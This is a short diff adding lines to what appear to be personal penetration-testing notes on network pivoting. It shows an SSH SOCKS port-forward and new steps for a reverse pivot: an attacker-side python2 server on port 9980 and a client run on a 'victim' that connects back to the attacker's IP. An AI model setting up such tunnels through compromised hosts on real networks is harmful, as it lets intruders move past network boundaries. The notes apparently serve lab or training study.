@@ -55,7 +55,17 @@ SSH Pivoting
 	ssh -D 8088 privilege@192.168.80.10
 	netstat -ano | grep 8088
 
+rpivoting
 
+	+ attacker set up
+ 		-check python2 availble 
+		python2 server.py --server-port 9980 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 9050
+	 	ifconfig -> copy this ip to victim
+   
+  	+ victim set up
+  	
+		copy rpivoting to victim client 
+		python2 client.py --server-ip 10.10.200.124 --server-port 9980
 
 
 # Firefox Find Information
